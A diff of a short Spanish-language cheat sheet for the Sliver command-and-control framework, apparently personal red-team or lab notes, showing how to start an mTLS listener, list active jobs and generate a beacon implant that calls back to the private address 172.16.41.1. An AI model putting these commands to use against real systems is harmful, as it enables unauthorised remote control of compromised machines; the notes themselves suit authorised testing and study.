@@ -1,16 +1,21 @@
 ## Listeners
-- mtls (para beacons)
-- http (para stagers)
+
+> NOTA: mtls (para beacons), http (para stagers)
+
+# Creas un listener
 
 ``` bash
-# Crear un listener
-mtls
-mtls --host 0.0.0.0 --port 443
+mtls -l 8888
+```
+
 # Ver los listeners activos
-listeners
+
+```
+jobs
 ```
 
 ## Beacons
+
 ``` bash
 # Crear un implante
 generate beacon --mtls 172.16.41.1 --save ~/projects/sliver
